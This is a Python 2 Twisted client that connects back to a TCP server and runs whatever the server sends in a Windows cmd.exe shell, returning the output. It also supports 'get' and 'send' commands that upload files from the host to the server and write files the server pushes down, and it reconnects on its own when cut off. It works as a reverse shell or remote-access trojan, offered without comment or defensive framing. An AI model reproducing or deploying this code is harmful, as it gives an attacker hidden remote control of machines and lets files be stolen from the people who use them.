import subprocess, re
from twisted.internet.protocol import Protocol, ClientFactory
from twisted.internet import reactor

cmdpath = r'cmd.exe /k "cd "'+r'C:\"'
currentdir = ''
cmdstate = 0
filename = '' 
filedata = ''

'''
cmdstate 1: file is being received
cmdstate 0: file not being received

msgend001 : Message sent normally
msgend002 : Error occurred
msgend003 : Indicator for receiving data
msgend004 : Indicator for finished receiving
'''

class EchoCMD(Protocol):
    def dataReceived(self, data):
        global cmdpath
        global currentdir
        global cmdstate
        global filename
        global filedata
#------------------------------------------------------------------------------------------------------CMDSTATE 1
        if cmdstate == 1:
            #------------------------------------------------------------------------------------------RECV FILE FROM SERVER
            if 'msgend001' in data: #end of message/file transfer
                filedata += data[:-9]
                with open(filename, 'wb') as f:
                    f.write(filedata) 
                filedata = ''
                self.transport.write('msgend004') #indicator data is finished sending
                cmdstate = 0
            else:  
                filedata += data

#------------------------------------------------------------------------------------------------------CMDSTATE 0
        else:
            #------------------------------------------------------------------------------------------SEND FILE TO SERVER
            if data[:3].lower() == "get":
                filename = currentdir+'\\'+data[4:]
                if currentdir == '':
                    self.transport.write('Currentdir not obtained as yet. Send cmd first e.g. cd\n')
                    self.transport.write('msgend002')
                else:
                    try:
                        filebytes = ''
                        with open(filename, "rb") as f:
                            filebytes = f.read()
                        self.transport.write(filebytes)
                        self.transport.write('msgend001')
                    except IOError:
                        self.transport.write('File could not be read\n')
                        self.transport.write('msgend002')
            #------------------------------------------------------------------------------------------sets up RECV FILE FROM SERVER
            elif data[:4].lower() == "send":
                filename = currentdir+'\\'+data[5:]
                if currentdir is '':
                    self.transport.write('Currentdir not obtained as yet. Send cmd first e.g. cd\n')
                    self.transport.write('msgend002')
                else:
                    cmdstate = 1
                    self.transport.write('msgend003') #indicator to send data
            #------------------------------------------------------------------------------------------COMMUNICATE WITH CLIENT CMD PROMPT
            else:

                proc =  subprocess.Popen(
                    cmdpath, 
                    stdin = subprocess.PIPE, 
                    stdout = subprocess.PIPE,
                    stderr = subprocess.PIPE,
                    shell = True)

                mycmd = str(data)
                stdout, stderr = proc.communicate(mycmd+'\n')

                lines = re.split("\n+", stdout) #breaks stdout into list of lines
                lastline = lines[len(lines)-1] #fetches last line which contains recent path
                stripdir = re.search('.*?(?=>)', lastline) #extracts path from last line

                currentdir = stripdir.group(0)
                cmdpath = 'cmd.exe /k \"cd '+ currentdir +'\"' #next open shell starts here

                self.transport.write(str(stdout+stderr))
                self.transport.write('msgend001')
#------------------------------------------------------------------------------------------------------

class EchoClientFactory(ClientFactory):
    def startedConnecting(self, connector):
        print 'Started to connect.'

    def buildProtocol(self, addr):
        print 'Connected.'
        return EchoCMD()

    def clientConnectionLost(self, connector, reason):
        global cmdstate
        cmdstate = 0
        print 'Lost connection.  Reason:', reason
        connector.connect()

    def clientConnectionFailed(self, connector, reason):
        global cmdstate
        cmdstate = 0
        print 'Connection failed. Reason:', reason
        connector.disconnect()
        connector.connect()


reactor.connectTCP("localhost", 2881, EchoClientFactory())
reactor.run()